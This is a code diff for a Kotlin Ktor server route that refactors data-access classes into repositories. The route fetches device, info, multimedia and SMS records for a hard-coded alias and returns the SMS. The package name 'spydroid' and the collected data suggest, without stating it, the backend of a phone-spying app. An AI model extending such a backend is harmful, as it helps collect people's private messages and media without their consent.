@@ -20,10 +20,10 @@ package net.spydroid.server.plugins
 import io.ktor.server.application.*
 import io.ktor.server.response.*
 import io.ktor.server.routing.*
-import net.spydroid.server.db.domain.DevicesDao
-import net.spydroid.server.db.domain.InfoDao
-import net.spydroid.server.db.domain.MultimediaDao
-import net.spydroid.server.db.domain.SmsDao
+import net.spydroid.server.domain.DevicesRepository
+import net.spydroid.server.domain.InfoRepository
+import net.spydroid.server.domain.MultimediaRepository
+import net.spydroid.server.domain.SmsRepository
 import org.koin.ktor.ext.inject
 
 
@@ -33,19 +33,19 @@ private object Routes {
 
 fun Application.configureRouting() {
 
-    val devicesDao: DevicesDao by inject()
-    val infoDao: InfoDao by inject()
-    val multimediaDao: MultimediaDao by inject()
-    val smsDao: SmsDao by inject()
+
+    val devicesRepository: DevicesRepository by inject()
+    val infoRepository: InfoRepository by inject()
+    val multimediaRepository: MultimediaRepository by inject()
+    val smsRepository: SmsRepository by inject()
 
     routing {
         get(Routes.USERS) {
             val ALIAS = "JUAN_KARLOS"
-            val devices = devicesDao.filerWithAlias(ALIAS)
-            val info = infoDao.filerWithAlias(ALIAS)
-            val multimedia = multimediaDao.filerWithAlias(ALIAS)
-            val sms = smsDao.filerWithAlias(ALIAS)
-
+            val devices = devicesRepository.filerWithAlias(ALIAS)
+            val info = infoRepository.filerWithAlias(ALIAS)
+            val multimedia = multimediaRepository.filerWithAlias(ALIAS)
+            val sms = smsRepository.filerWithAlias(ALIAS)
             call.respond(sms)
         }
     }
